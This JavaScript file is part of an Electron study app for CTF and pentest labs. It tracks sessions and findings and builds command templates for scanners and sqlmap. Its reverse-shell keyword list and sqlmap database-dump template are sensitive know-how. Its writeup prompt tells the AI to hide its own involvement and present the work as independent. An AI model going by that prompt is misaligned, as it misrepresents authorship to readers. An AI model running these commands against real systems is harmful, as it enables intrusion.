// renderer-part1.js — CYBERLAB COMPANION renderer (Part 1 of 4)
// Covers: embedded module logic, app state, init, splash, wizard, themes
// NOTE: contextIsolation=true, nodeIntegration=false — no require() allowed
//       All IPC via window.electronAPI  |  CDN globals: hljs, Chart
'use strict';

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 1A — THEMES  (two-layer: core + personality)
// ═══════════════════════════════════════════════════════════════════════════════

const DIFFICULTY_COLORS = { Easy:'#3fb950', Medium:'#d29922', Hard:'#f85149', Insane:'#a371f7' };

const HIGHLIGHT_THEMES = {
  neutral:'github-dark', cyberpunk:'atom-one-dark',
  terminal:'base16/green-screen', threat:'base16/tomorrow-night'
};

// Legacy single-string theme → two-layer mapping
const LEGACY_THEME_MAP = {
  'stealth':   { core: 'stealth',   personality: 'neutral' },
  'cyberpunk': { core: 'stealth',   personality: 'cyberpunk' },
  'terminal':  { core: 'oled',      personality: 'terminal' },
  'threat':    { core: 'stealth',   personality: 'threat' },
  'warrior':   { core: 'stealth',   personality: 'threat' },
  'graphite':  { core: 'graphite',  personality: 'neutral' },
  'oled':      { core: 'oled',      personality: 'neutral' },
  'frost':     { core: 'frost',     personality: 'neutral' },
};

function applyTheme(theme, animate = true) {
  // Handle legacy single-string theme saved from old version
  if (typeof theme === 'string') {
    theme = LEGACY_THEME_MAP[theme] || { core: 'stealth', personality: 'neutral' };
  }
  const core        = (theme && theme.core)        || 'stealth';
  const personality = (theme && theme.personality) || 'neutral';
  const el = document.documentElement;
  if (animate) el.style.transition = 'background-color 0.3s,color 0.3s';
  el.setAttribute('data-core', core);
  el.setAttribute('data-personality', personality);
  el.removeAttribute('data-theme');
  // Body class for personality-specific rules
  document.body.classList.toggle('bg-texture', personality === 'cyberpunk');
  document.body.classList.toggle('bg-vignette', personality === 'threat');
  document.body.classList.toggle('theme-cursor-blink', personality === 'terminal');
  // Update highlight.js theme link
  const link = document.getElementById('hljs-theme');
  if (link) link.href = `https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/${HIGHLIGHT_THEMES[personality] || 'github-dark'}.min.css`;
  // Update top-bar theme select to reflect core
  const themeSel = document.getElementById('theme-select');
  if (themeSel) themeSel.value = core;
  if (animate) setTimeout(() => el.style.transition = '', 350);
}

// ─── Two-layer theme picker helpers ───────────────────────────────────────────

function updateThemeComboLabel(id, core, personality) {
  const el = document.getElementById(id);
  if (el) el.textContent = _capitalize(core) + ' + ' + _capitalize(personality);
}
function _capitalize(s) { return s ? s.charAt(0).toUpperCase() + s.slice(1) : s; }

// Wizard picker state
let _wizardCore        = 'stealth';
let _wizardPersonality = 'neutral';

function initWizardThemePicker() {
  document.querySelectorAll('#wizard-core-row .theme-chip').forEach(btn => {
    btn.addEventListener('click', () => {
      _wizardCore = btn.dataset.core;
      document.querySelectorAll('#wizard-core-row .theme-chip').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      applyTheme({ core: _wizardCore, personality: _wizardPersonality });
      updateThemeComboLabel('wizard-theme-combo', _wizardCore, _wizardPersonality);
    });
  });
  document.querySelectorAll('#wizard-personality-row .theme-chip').forEach(btn => {
    btn.addEventListener('click', () => {
      _wizardPersonality = btn.dataset.personality;
      document.querySelectorAll('#wizard-personality-row .theme-chip').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      applyTheme({ core: _wizardCore, personality: _wizardPersonality });
      updateThemeComboLabel('wizard-theme-combo', _wizardCore, _wizardPersonality);
    });
  });
}

// Settings picker state
let _settingsCore        = 'stealth';
let _settingsPersonality = 'neutral';

// Re-sync the active chip highlights to match AppState.config.theme — call whenever settings screen is shown.
function syncSettingsThemeChips() {
  const t = AppState.config.theme || {};
  _settingsCore        = (typeof t === 'object' ? t.core        : LEGACY_THEME_MAP[t] && LEGACY_THEME_MAP[t].core)        || 'stealth';
  _settingsPersonality = (typeof t === 'object' ? t.personality : LEGACY_THEME_MAP[t] && LEGACY_THEME_MAP[t].personality) || 'neutral';
  document.querySelectorAll('#settings-core-row .theme-chip').forEach(b => {
    b.classList.toggle('active', b.dataset.core === _settingsCore);
  });
  document.querySelectorAll('#settings-personality-row .theme-chip').forEach(b => {
    b.classList.toggle('active', b.dataset.personality === _settingsPersonality);
  });
  updateThemeComboLabel('settings-theme-combo', _settingsCore, _settingsPersonality);
}

function initSettingsThemePicker() {
  const t = AppState.config.theme || {};
  _settingsCore        = (typeof t === 'object' ? t.core        : LEGACY_THEME_MAP[t] && LEGACY_THEME_MAP[t].core)        || 'stealth';
  _settingsPersonality = (typeof t === 'object' ? t.personality : LEGACY_THEME_MAP[t] && LEGACY_THEME_MAP[t].personality) || 'neutral';
  document.querySelectorAll('#settings-core-row .theme-chip').forEach(b => {
    b.classList.toggle('active', b.dataset.core === _settingsCore);
    b.addEventListener('click', async () => {
      _settingsCore = b.dataset.core;
      document.querySelectorAll('#settings-core-row .theme-chip').forEach(x => x.classList.remove('active'));
      b.classList.add('active');
      applyTheme({ core: _settingsCore, personality: _settingsPersonality });
      AppState.config.theme = { core: _settingsCore, personality: _settingsPersonality };
      await window.electronAPI.saveConfig(AppState.config);
      updateThemeComboLabel('settings-theme-combo', _settingsCore, _settingsPersonality);
      showToast(_capitalize(_settingsCore) + ' + ' + _capitalize(_settingsPersonality), 'success', 1500);
    });
  });
  document.querySelectorAll('#settings-personality-row .theme-chip').forEach(b => {
    b.classList.toggle('active', b.dataset.personality === _settingsPersonality);
    b.addEventListener('click', async () => {
      _settingsPersonality = b.dataset.personality;
      document.querySelectorAll('#settings-personality-row .theme-chip').forEach(x => x.classList.remove('active'));
      b.classList.add('active');
      applyTheme({ core: _settingsCore, personality: _settingsPersonality });
      AppState.config.theme = { core: _settingsCore, personality: _settingsPersonality };
      await window.electronAPI.saveConfig(AppState.config);
      updateThemeComboLabel('settings-theme-combo', _settingsCore, _settingsPersonality);
      showToast(_capitalize(_settingsCore) + ' + ' + _capitalize(_settingsPersonality), 'success', 1500);
    });
  });
  updateThemeComboLabel('settings-theme-combo', _settingsCore, _settingsPersonality);
}

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 1B — SOUNDS  (from sounds.js — browser AudioContext)
// ═══════════════════════════════════════════════════════════════════════════════

let _audioCtx = null;
let _soundsEnabled = false;
let _masterVolume = 0.5;

function _getCtx() {
  if (!_audioCtx) _audioCtx = new (window.AudioContext || window.webkitAudioContext)();
  return _audioCtx;
}

function _playTone(opts) {
  if (!_soundsEnabled) return;
  try {
    const ctx = _getCtx();
    const { frequency=440, type='sine', duration=0.2, volume=0.3, attack=0.01,
            decay=0.1, sustain=0.5, release=0.1, detune=0, delay=0 } = opts;
    const t0 = ctx.currentTime + delay;
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain); gain.connect(ctx.destination);
    osc.type = type; osc.frequency.setValueAtTime(frequency, t0);
    if (detune) osc.detune.setValueAtTime(detune, t0);
    const vol = volume * _masterVolume;
    gain.gain.setValueAtTime(0, t0);
    gain.gain.linearRampToValueAtTime(vol, t0 + attack);
    gain.gain.linearRampToValueAtTime(vol * sustain, t0 + attack + decay);
    gain.gain.setValueAtTime(vol * sustain, t0 + duration - release);
    gain.gain.linearRampToValueAtTime(0, t0 + duration);
    osc.start(t0); osc.stop(t0 + duration);
  } catch(e) {}
}

const Sounds = {
  init(cfg={}) { _soundsEnabled = !!cfg.soundsEnabled; _masterVolume = (cfg.volume||50)/100; },
  setEnabled(v) { _soundsEnabled = !!v; },
  setVolume(v) { _masterVolume = Math.max(0, Math.min(1, v/100)); },
  finding() { _playTone({frequency:880,type:'sine',duration:0.1,volume:0.25,attack:0.005,decay:0.05,sustain:0.3,release:0.04}); },
  flag() {
    _playTone({frequency:523,type:'triangle',duration:0.15,volume:0.3,attack:0.01,decay:0.05,sustain:0.6,release:0.08});
    _playTone({frequency:659,type:'triangle',duration:0.15,volume:0.3,attack:0.01,delay:0.1,decay:0.05,sustain:0.6,release:0.08});
    _playTone({frequency:784,type:'triangle',duration:0.15,volume:0.35,attack:0.01,delay:0.2,decay:0.05,sustain:0.6,release:0.1});
  },
  achievement() {
    [392,523,659,784].forEach((f,i) => _playTone({frequency:f,type:'triangle',duration:i===3?0.25:0.12,volume:i===3?0.4:0.3,attack:0.01,delay:i*0.1,decay:0.04,sustain:0.5,release:0.06}));
  },
  sessionComplete() {
    _playTone({frequency:440,type:'sine',duration:0.12,volume:0.3,attack:0.01,decay:0.06,sustain:0.4,release:0.05});
    _playTone({frequency:550,type:'sine',duration:0.12,volume:0.3,attack:0.01,delay:0.12,decay:0.06,sustain:0.4,release:0.05});
    _playTone({frequency:660,type:'sine',duration:0.2,volume:0.35,attack:0.01,delay:0.24,decay:0.08,sustain:0.5,release:0.1});
  },
  apiError() {
    _playTone({frequency:330,type:'sawtooth',duration:0.1,volume:0.2,attack:0.005,decay:0.04,sustain:0.3,release:0.05});
    _playTone({frequency:277,type:'sawtooth',duration:0.1,volume:0.2,attack:0.005,delay:0.1,decay:0.04,sustain:0.3,release:0.05});
  },
  timerExpiry() {
    _playTone({frequency:880,type:'square',duration:0.25,volume:0.25,attack:0.005,decay:0.08,sustain:0.5,release:0.1});
    _playTone({frequency:660,type:'square',duration:0.25,volume:0.25,attack:0.005,delay:0.3,decay:0.08,sustain:0.5,release:0.1});
  },
  focusToggle() {
    for (let i=0;i<8;i++) _playTone({frequency:200+(i*60),type:'sine',duration:0.08,volume:0.12,attack:0.005,delay:i*0.018,decay:0.02,sustain:0.3,release:0.05});
  },
  themeSwitch() { _playTone({frequency:660,type:'sine',duration:0.04,volume:0.12,attack:0.002,decay:0.01,sustain:0.2,release:0.02}); },
  click() { _playTone({frequency:660,type:'sine',duration:0.04,volume:0.12,attack:0.002,decay:0.01,sustain:0.2,release:0.02}); },
};

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 1C — SESSION LOGIC  (from session.js)
// ═══════════════════════════════════════════════════════════════════════════════

const FINDING_TYPES = ['PORT','CRED','CVE','FLAG','FILE','SERVICE','USER','HASH'];
const FLAG_PATTERNS = [
  /HTB\{[^}]+\}/g, /THM\{[^}]+\}/g, /FLAG\{[^}]+\}/g,
  /picoCTF\{[^}]+\}/g, /ctf\{[^}]+\}/gi,
  /[a-zA-Z0-9_-]+\{[a-zA-Z0-9_\-+/=!@#$%^&*.,?]+\}/g,
];
const METHODOLOGY_PHASES     = ['Reconnaissance','Enumeration','Exploitation','Post-Exploitation','Privilege Escalation','Lateral Movement','Flag Capture'];
const METHODOLOGY_PHASES_OSINT = ['Passive Recon','Active Recon','Username/Identity Enumeration','Metadata Analysis','Domain/Infrastructure Intel','Social Engineering Analysis','Reporting'];

function createSession(opts={}) {
  return {
    id: Date.now().toString(36) + Math.random().toString(36).slice(2),
    name: opts.name || opts.labName || 'New Session',
    labName: opts.name || opts.labName || 'New Session',
    platform: opts.platform || 'HTB',
    difficulty: opts.difficulty || 'Medium',
    labType: opts.labType || 'HTB/THM Linux',
    isOsint: opts.labType === 'OSINT/CTF',
    startTime: Date.now(),
    endTime: null,
    durationMinutes: 0,
    target: { ip: opts.ip || opts.targetIp || '', hostname: opts.hostname || '', os: opts.targetOs || 'Unknown', notes:'' },
    targetIp: opts.targetIp || opts.ip || '',
    targetHostname: opts.hostname || '',
    targetOs: opts.targetOs || '',
    notesList: [],
    findings: { ports:[], users:[], credentials:[], flags:[], cves:[], files:[], hashes:[], services:[], notes:'' },
    methodology: {
      phases: opts.labType === 'OSINT/CTF' ? [...METHODOLOGY_PHASES_OSINT] : [...METHODOLOGY_PHASES],
      completed: [],
      activePhase: null,
    },
    hintLevel: 1,
    teachMeMode: false,
    usedTeachMe: false,
    chat: [],
    toolsUsed: [],
    commandsCopied: [],
    terminalOutputs: [],
    timer: { enabled: !!(opts.timerEnabled), totalSeconds: (opts.timerMins||120)*60, elapsed:0, running:false, overtime:false },
    examMode: !!(opts.timerEnabled),
    complete: false,
    mistakes: { repeatedCommands:{}, skippedSteps:[], hintEscalations:{}, methodologyBreaks:[] },
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  };
}

function sessionAddFinding(session, type, value) {
  const entry = { id: Date.now().toString(36)+Math.random().toString(36).slice(2), value, addedAt: new Date().toISOString() };
  switch(type) {
    case 'PORT':    if(!session.findings.ports.find(f=>f.value===value))       { session.findings.ports.push(entry); return entry; } break;
    case 'USER':    if(!session.findings.users.find(f=>f.value===value))       { session.findings.users.push(entry); return entry; } break;
    case 'CRED':    if(!session.findings.credentials.find(f=>f.value===value)) { session.findings.credentials.push(entry); return entry; } break;
    case 'FLAG':    if(!session.findings.flags.find(f=>f.value===value))       { const e2={...entry,validated:/^[a-zA-Z0-9_-]+\{[^}]+\}$/.test(value)}; session.findings.flags.push(e2); return e2; } break;
    case 'CVE':     if(!session.findings.cves.find(f=>f.value===value))        { session.findings.cves.push(entry); return entry; } break;
    case 'FILE':    if(!session.findings.files.find(f=>f.value===value))       { session.findings.files.push(entry); return entry; } break;
    case 'HASH':    if(!session.findings.hashes.find(f=>f.value===value))      { session.findings.hashes.push(entry); return entry; } break;
    case 'SERVICE': if(!session.findings.services.find(f=>f.value===value))    { session.findings.services.push(entry); return entry; } break;
  }
  return null;
}

function sessionRemoveFinding(session, type, id) {
  const map = {PORT:'ports',USER:'users',CRED:'credentials',FLAG:'flags',CVE:'cves',FILE:'files',HASH:'hashes',SERVICE:'services'};
  const key = map[type];
  if(!key) return;
  session.findings[key] = session.findings[key].filter(f => f.id !== id);
}

function parseFindings(text, session) {
  const found = [];
  const pattern = /\[FINDING:(\w+)\]\s*([^\n\[]+)/gi;
  let m;
  while((m = pattern.exec(text)) !== null) {
    const type = m[1].toUpperCase();
    const value = m[2].trim();
    if(!FINDING_TYPES.includes(type)) continue;
    const e = sessionAddFinding(session, type, value);
    if(e) found.push({type, value, entry:e});
  }
  FLAG_PATTERNS.forEach(re => {
    const flags = text.match(re);
    if(flags) flags.forEach(f => {
      if(!session.findings.flags.find(x=>x.value===f)) {
        const e = sessionAddFinding(session, 'FLAG', f);
        if(e) found.push({type:'FLAG', value:f, entry:e});
      }
    });
  });
  return found;
}

function buildWriteupSystemPrompt() {
  return `You are a technical writer producing a cybersecurity lab writeup for ItsEliias. Using only the successful findings, commands, and methodology phases from the session state provided, write a clean technical writeup in neutral voice.

Rules:
- Write only what succeeded — omit all failed attempts and hints received
- Never reference any AI, assistant, or hint system
- Write as if ItsEliias worked through this methodically and independently
- Infer logical thought process between steps for narrative coherence
- Every command in a fenced code block with correct language tag (bash, powershell, python, etc.)
- Include actual output snippets where session data contains them
- Be technical and precise — this is a reference document
- Write sections in exactly the order specified in the prompt
- Neutral voice throughout: "nmap revealed...", "directory enumeration uncovered...", "the service was vulnerable to..."

Writeup sections order:
1. YAML Frontmatter (title, date, platform, difficulty, author: ItsEliias, tags, completed: true, ip, time_to_complete)
2. Overview (2-3 sentences: box type, OS, key vulnerability theme)
3. Reconnaissance (initial scans, exact commands, what was found)
4. Enumeration (deeper service enumeration, key discoveries)
5. Exploitation (vulnerability, exact exploit, how initial access gained)
6. Post-Exploitation / Privilege Escalation (how root/admin achieved)
7. Flags (user flag and root flag, values and paths)
8. If I Did This Again (2-3 sentences on efficiency improvements)
9. Lessons Learned (3-5 bullet points of key technical takeaways)

For CTF labs use: Overview, Challenge Description, Solution, Flag, Techniques Used, Lessons Learned
For Cisco/Networking: Overview, Topology, Configuration Steps, Verification Commands, Lessons Learned
For Web App labs: Overview, Reconnaissance, Vulnerability Discovery, Exploitation, Impact, Remediation Notes, Lessons Learned`;
}

function buildWriteupContext(session) {
  const flags   = session.findings.flags.map(f=>f.value).join(', ') || 'Not captured';
  const cmds    = session.commandsCopied.map(c=>c.command).join('\n');
  const elapsed = Math.floor((Date.now() - session.startTime)/1000);
  const h = Math.floor(elapsed/3600), m = Math.floor((elapsed%3600)/60);
  const dur = h>0 ? `${h}h ${m}m` : `${m}m`;
  const findings = JSON.stringify({
    ports:    session.findings.ports.map(p=>p.value),
    users:    session.findings.users.map(u=>u.value),
    credentials: session.findings.credentials.map(c=>c.value),
    cves:     session.findings.cves.map(c=>c.value),
    flags:    session.findings.flags.map(f=>f.value),
    services: session.findings.services.map(s=>s.value),
    files:    session.findings.files.map(f=>f.value),
  }, null, 2);
  const chatCtx = session.chat.filter(m=>m.role==='assistant')
    .map(m=>`[AI]: ${(m.content||'').slice(0,400)}`).join('\n\n');
  return {
    labName: session.labName,
    platform: session.platform,
    difficulty: session.difficulty,
    labType: session.labType,
    targetIP: session.target.ip,
    targetOS: session.target.os,
    duration: dur,
    completionDate: new Date().toISOString().slice(0,10),
    methodologyCompleted: session.methodology.completed.join(', '),
    flags, findings, commands: cmds, chatContext: chatCtx,
  };
}

function getMistakePatterns(session) {
  const patterns = [];
  Object.entries(session.mistakes.repeatedCommands||{}).forEach(([cmd,count]) => {
    if(count>1) patterns.push(`Ran same command ${count}× : "${cmd.slice(0,60)}"`);
  });
  Object.entries(session.mistakes.hintEscalations||{}).forEach(([topic,count]) => {
    if(count>=2) patterns.push(`Hint escalated ${count}× on: ${topic}`);
  });
  (session.mistakes.methodologyBreaks||[]).forEach(b => {
    patterns.push(`Completed "${b.phase}" after already completing: ${b.laterPhases.join(', ')}`);
  });
  const checkRobots = (session.commandsCopied||[]).some(c=>c.command.includes('robots.txt'));
  const hasWebEnum  = (session.commandsCopied||[]).some(c=>['gobuster','ffuf','feroxbuster','dirb','nikto'].some(t=>c.command.includes(t)));
  if(hasWebEnum && !checkRobots) patterns.push('Web enumeration done but robots.txt not explicitly checked');
  return patterns;
}

function inferTechniques(session) {
  const t = new Set();
  const text = (session.chat||[]).map(m=>m.content||'').join(' ').toLowerCase();
  const kws = {
    'SQL Injection':['sqlmap','sql injection','union select'],
    'XSS':['xss','cross-site script'],
    'LFI/RFI':['lfi','rfi','local file inclusion'],
    'SSRF':['ssrf','server-side request'],
    'Privilege Escalation':['linpeas','winpeas','privesc','privilege escalation','suid','sudo -l'],
    'Active Directory':['bloodhound','kerberoast','impacket','crackmapexec','active directory'],
    'Hash Cracking':['hashcat','john the ripper','hash crack'],
    'Reverse Shell':['reverse shell','revshell','/bin/bash','nc -lvnp'],
    'Port Scanning':['nmap','masscan','rustscan'],
    'Web Enumeration':['gobuster','ffuf','feroxbuster','dirb'],
    'SMB':['smbclient','enum4linux','smb'],
    'Buffer Overflow':['buffer overflow','bof'],
  };
  Object.entries(kws).forEach(([tech,arr]) => { if(arr.some(k=>text.includes(k))) t.add(tech); });
  return Array.from(t);
}

function serializeSession(session) {
  return { ...session, toolsUsed: Array.isArray(session.toolsUsed)?session.toolsUsed:[], updatedAt: new Date().toISOString() };
}

function deserializeSession(data) {
  const s = { ...data };
  if(!Array.isArray(s.toolsUsed)) s.toolsUsed = [];
  return s;
}

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 1D — AI SYSTEM PROMPT BUILDER
// ═══════════════════════════════════════════════════════════════════════════════

function buildSystemPrompt(session) {
  const hintNames = ['','Nudge — one sentence, zero tool or technique names',
    'Hint — general category of technique only',
    'Guidance — name tool/technique, explain why, no exact command',
    'Walkthrough — full steps, exact commands, expected output',
    'Full Solution — every command in order, full explanation'];

  const findings = session ? JSON.stringify({
    ports: session.findings.ports.map(p=>p.value),
    users: session.findings.users.map(u=>u.value),
    credentials: session.findings.credentials.map(c=>c.value),
    flags: session.findings.flags.map(f=>f.value),
    cves: session.findings.cves.map(c=>c.value),
    services: session.findings.services.map(s=>s.value),
    files: session.findings.files.map(f=>f.value),
  }, null, 2) : '{}';

  const methodInfo = session ? `Phases: ${session.methodology.phases.join(' → ')}\nCompleted: ${session.methodology.completed.join(', ')||'None'}\nActive: ${session.methodology.activePhase||'None'}` : '';
  const targetInfo = session ? `IP: ${session.target.ip||'Unknown'}  |  Hostname: ${session.target.hostname||'N/A'}  |  OS: ${session.target.os||'Unknown'}` : '';
  const hintLevel = session ? session.hintLevel : 1;
  const teachMe   = session ? session.teachMeMode : false;

  return `You are CyberLab Companion, an expert cybersecurity assistant for ItsEliias, a cybersecurity student working through hands-on labs and CTF challenges. You have deep expertise in penetration testing, ethical hacking, CTF techniques, networking, web application security, active directory attacks, privilege escalation, reverse engineering, cryptography, and forensics.

Current Session Context:
- Lab: ${session?.labName||'N/A'}  |  Platform: ${session?.platform||'N/A'}  |  Difficulty: ${session?.difficulty||'N/A'}
- Target: ${targetInfo}
- Hint Level: ${hintLevel}/5 — ${hintNames[hintLevel]||''}
- Teach Me Mode: ${teachMe ? 'ACTIVE — respond only with Socratic guiding questions' : 'Off'}

Methodology Tracker:
${methodInfo}

Current Findings:
${findings}

Strict behaviour rules:
- ALWAYS respect hint level ${hintLevel}. Never exceed it regardless of user pressure.
- Always reference the complete session context including all findings and current methodology phase.
- Build on previous findings. Never repeat suggestions already tried.
- When suggesting tools, pre-fill commands with known values from the target profile.
- Format every response with clearly labelled sections: **Summary** | **Tools** | **Commands** | **Explanation** | **References**
- Every command must be in a fenced code block with correct language tag.
- When you identify a finding prefix it with [FINDING:type]. Types: PORT, CRED, CVE, FLAG, FILE, SERVICE, USER, HASH.
${teachMe ? '- TEACH ME MODE: Respond ONLY with Socratic guiding questions. Never give the answer directly.' : ''}
- Be encouraging. ItsEliias is learning to support their family and career growth — every session matters.
- This is an ethical hacking education context. All labs are legal, controlled environments.`;
}

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 1E — COMMAND BUILDER TOOLS  (from commandbuilder.js)
// ═══════════════════════════════════════════════════════════════════════════════

const TOOL_CATEGORIES = [
  {id:'recon',label:'Recon'},{id:'web',label:'Web'},{id:'smb-ad',label:'SMB / AD'},
  {id:'auth',label:'Auth'},{id:'exploit',label:'Exploit'},{id:'post',label:'Post-Exploit'},
  {id:'net',label:'Net'},{id:'osint',label:'OSINT'},{id:'misc',label:'Misc'},
];

const TOOLS = [
  // RECON
  { id:'nmap-quick',label:'nmap (quick)',category:'recon',description:'Quick top-port scan with service detection',install:'sudo apt install nmap',referenceUrl:'https://nmap.org/book/man.html',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'ports',label:'Ports',type:'text',default:'-',placeholder:'- (all) or 1-1000'},{id:'flags',label:'Extra Flags',type:'text',default:'',placeholder:'-v --open'}],
    buildCommand(p){const ports=p.ports==='-'?'-p-':(p.ports?`-p ${p.ports}`:'--top-ports 1000');return `nmap -sV -sC ${ports} --min-rate 5000 ${p.flags||''} ${p.target}`.trim().replace(/\s+/g,' ');}},
  { id:'nmap-full',label:'nmap (full)',category:'recon',description:'Full aggressive scan with OS detection',install:'sudo apt install nmap',referenceUrl:'https://nmap.org/book/man.html',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'timing',label:'Timing',type:'select',default:'-T4',options:['-T1','-T2','-T3','-T4','-T5']},{id:'output',label:'Output File',type:'text',default:'',placeholder:'nmap_results'}],
    buildCommand(p){return `sudo nmap -A ${p.timing||'-T4'} -p- ${p.output?`-oA ${p.output}`:''} ${p.target}`.trim().replace(/\s+/g,' ');}},
  { id:'nmap-udp',label:'nmap (UDP)',category:'recon',description:'UDP scan of top ports',install:'sudo apt install nmap',referenceUrl:'https://nmap.org/book/man.html',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'top',label:'Top N Ports',type:'text',default:'100',placeholder:'100'}],
    buildCommand(p){return `sudo nmap -sU --top-ports ${p.top||100} -sV ${p.target}`;}},
  { id:'nmap-script',label:'nmap (script)',category:'recon',description:'Run specific NSE scripts',install:'sudo apt install nmap',referenceUrl:'https://nmap.org/nsedoc/',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'port',label:'Port',type:'text',default:'',placeholder:'445'},{id:'script',label:'Script',type:'text',default:'vuln',placeholder:'smb-vuln-ms17-010'}],
    buildCommand(p){return `nmap ${p.port?`-p ${p.port}`:''} --script=${p.script||'vuln'} ${p.target}`.trim();}},
  { id:'masscan',label:'masscan',category:'recon',description:'Ultra-fast port scanner',install:'sudo apt install masscan',referenceUrl:'https://github.com/robertdavidgraham/masscan',
    params:[{id:'target',label:'Target IP/Range',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'ports',label:'Ports',type:'text',default:'1-65535',placeholder:'1-65535'},{id:'rate',label:'Rate (pps)',type:'text',default:'1000',placeholder:'1000'}],
    buildCommand(p){return `sudo masscan -p${p.ports||'1-65535'} ${p.target} --rate=${p.rate||1000} -e tun0`;}},
  { id:'rustscan',label:'rustscan',category:'recon',description:'Fast port scanner that feeds into nmap',install:'cargo install rustscan',referenceUrl:'https://github.com/RustScan/RustScan',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'batch',label:'Batch Size',type:'text',default:'5000',placeholder:'5000'}],
    buildCommand(p){return `rustscan -a ${p.target} -b ${p.batch||5000} -- -sV -sC`;}},
  // WEB
  { id:'gobuster-dir',label:'gobuster (dir)',category:'web',description:'Directory/file bruteforce',install:'sudo apt install gobuster',referenceUrl:'https://github.com/OJ/gobuster',
    params:[{id:'url',label:'URL',type:'text',autoFill:'url',placeholder:'http://10.10.10.x'},{id:'wordlist',label:'Wordlist',type:'text',default:'/usr/share/wordlists/dirb/common.txt',placeholder:'/usr/share/seclists/...'},{id:'ext',label:'Extensions',type:'text',default:'',placeholder:'php,txt,html'},{id:'threads',label:'Threads',type:'text',default:'50',placeholder:'50'},{id:'extra',label:'Extra Flags',type:'text',default:'',placeholder:'--no-error'}],
    buildCommand(p){return `gobuster dir -u ${p.url} -w ${p.wordlist} ${p.ext?`-x ${p.ext}`:''} -t ${p.threads||50} ${p.extra||''}`.trim().replace(/\s+/g,' ');}},
  { id:'gobuster-vhost',label:'gobuster (vhost)',category:'web',description:'Virtual host / subdomain discovery',install:'sudo apt install gobuster',referenceUrl:'https://github.com/OJ/gobuster',
    params:[{id:'url',label:'URL',type:'text',autoFill:'url',placeholder:'http://10.10.10.x'},{id:'wordlist',label:'Wordlist',type:'text',default:'/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt',placeholder:'subdomains wordlist'}],
    buildCommand(p){return `gobuster vhost -u ${p.url} -w ${p.wordlist} --append-domain`;}},
  { id:'ffuf',label:'ffuf',category:'web',description:'Fast web fuzzer',install:'sudo apt install ffuf',referenceUrl:'https://github.com/ffuf/ffuf',
    params:[{id:'url',label:'URL with FUZZ',type:'text',autoFill:'url',placeholder:'http://10.10.10.x/FUZZ'},{id:'wordlist',label:'Wordlist',type:'text',default:'/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt',placeholder:'wordlist path'},{id:'ext',label:'Extensions',type:'text',default:'',placeholder:'php,txt'},{id:'fc',label:'Filter Codes',type:'text',default:'404',placeholder:'404,403'},{id:'mc',label:'Match Codes',type:'text',default:'',placeholder:'200,301'}],
    buildCommand(p){return `ffuf -u ${p.url} -w ${p.wordlist} ${p.ext?`-e .${p.ext.split(',').join(',.')}`:''}  ${p.fc?`-fc ${p.fc}`:''} ${p.mc?`-mc ${p.mc}`:''} -v`.trim().replace(/\s+/g,' ');}},
  { id:'feroxbuster',label:'feroxbuster',category:'web',description:'Recursive content discovery',install:'sudo apt install feroxbuster',referenceUrl:'https://github.com/epi052/feroxbuster',
    params:[{id:'url',label:'URL',type:'text',autoFill:'url',placeholder:'http://10.10.10.x'},{id:'wordlist',label:'Wordlist',type:'text',default:'/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt',placeholder:'wordlist'},{id:'ext',label:'Extensions',type:'text',default:'',placeholder:'php,txt'}],
    buildCommand(p){return `feroxbuster -u ${p.url} -w ${p.wordlist} ${p.ext?`-x ${p.ext}`:''} --auto-tune`.trim();}},
  { id:'nikto',label:'nikto',category:'web',description:'Web server vulnerability scanner',install:'sudo apt install nikto',referenceUrl:'https://github.com/sullo/nikto',
    params:[{id:'target',label:'Target IP',type:'text',autoFill:'ip',placeholder:'10.10.10.x'},{id:'port',label:'Port',type:'text',default:'80',placeholder:'80'},{id:'ssl',label:'SSL',type:'select',default:'no',options:['no','yes']}],
    buildCommand(p){return `nikto -h ${p.target} -p ${p.port||80} ${p.ssl==='yes'?'-ssl':''}`.trim();}},
  { id:'wpscan',label:'wpscan',category:'web',description:'WordPress vulnerability scanner',install:'sudo apt install wpscan',referenceUrl:'https://github.com/wpscanteam/wpscan',
    params:[{id:'url',label:'WordPress URL',type:'text',autoFill:'url',placeholder:'http://10.10.10.x'},{id:'mode',label:'Enumerate',type:'text',default:'u,p,t',placeholder:'u,p,t'},{id:'apikey',label:'WPScan API Key',type:'text',default:'',placeholder:'optional'}],
    buildCommand(p){return `wpscan --url ${p.url} --enumerate ${p.mode||'u,p,t'} ${p.apikey?`--api-token ${p.apikey}`:''}`.trim();}},
  { id:'sqlmap',label:'sqlmap',category:'web',description:'Automated SQL injection',install:'sudo apt install sqlmap',referenceUrl:'https://sqlmap.org',
    params:[{id:'url',label:'URL',type:'text',autoFill:'url',placeholder:'http://10.10.10.x/page?id=1'},{id:'data',label:'POST Data',type:'text',default:'',placeholder:'user=admin&pass=test'},{id:'level',label:'Level',type:'select',default:'2',options:['1','2','3','4','5']},{id:'risk',label:'Risk',type:'select',default:'1',options:['1','2','3']},{id:'dbs',label:'Dump DBs',type:'select',default:'yes',options:['yes','no']}],
    buildCommand(p){return `sqlmap -u "${p.url}" ${p.data?`--data="${p.data}"`:''}  --level=${p.level||2} --risk=${p.risk||1} ${p.dbs==='yes'?'--dbs':''} --batch`.trim().replace(/\s+/g,' ');}},
  // SMB/AD
